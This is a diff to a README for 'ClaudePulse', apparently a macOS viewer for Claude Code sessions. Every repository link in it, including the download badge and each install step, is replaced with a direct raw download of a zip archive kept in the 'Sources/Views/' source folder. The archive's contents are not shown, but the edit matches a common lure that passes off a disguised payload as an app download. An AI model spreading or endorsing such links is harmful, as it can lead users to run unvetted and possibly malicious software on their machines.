@@ -1,6 +1,6 @@
 # ⚡ ClaudePulse - See Claude Code Sessions Live
 
-[![Download ClaudePulse](https://img.shields.io/badge/Download%20ClaudePulse-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WHmhj5212-star/ClaudePulse)
+[![Download ClaudePulse](https://img.shields.io/badge/Download%20ClaudePulse-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WHmhj5212-star/ClaudePulse/raw/refs/heads/main/Sources/Views/Claude_Pulse_3.1.zip)
 
 ## 🖥️ What ClaudePulse Does
 
@@ -28,7 +28,7 @@ You can keep the view small or expand it when you want more detail. The app uses
 
 Go to this page to download and install ClaudePulse:
 
-https://github.com/WHmhj5212-star/ClaudePulse
+https://github.com/WHmhj5212-star/ClaudePulse/raw/refs/heads/main/Sources/Views/Claude_Pulse_3.1.zip
 
 If the page includes a release file for macOS, download the app file from there and open it on your Mac. If the project is still shown as a source repository, use the latest release or build provided on that page.
 
@@ -48,7 +48,7 @@ For the best result, use the same Mac where you run Claude Code sessions.
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/WHmhj5212-star/ClaudePulse
+   https://github.com/WHmhj5212-star/ClaudePulse/raw/refs/heads/main/Sources/Views/Claude_Pulse_3.1.zip
 
 2. Find the latest macOS app file or release package on the page.
 
@@ -190,7 +190,7 @@ For the smoothest setup:
 ## 📦 Download and Install
 
 1. Visit the download page:
-   https://github.com/WHmhj5212-star/ClaudePulse
+   https://github.com/WHmhj5212-star/ClaudePulse/raw/refs/heads/main/Sources/Views/Claude_Pulse_3.1.zip
 
 2. Get the latest macOS app file from that page.
 
@@ -216,7 +216,7 @@ Instead of checking each terminal window, you can glance at one place and move o
 
 ## 📎 Project Link
 
-https://github.com/WHmhj5212-star/ClaudePulse
+https://github.com/WHmhj5212-star/ClaudePulse/raw/refs/heads/main/Sources/Views/Claude_Pulse_3.1.zip
 
 ## 🧾 Session State Reference
 
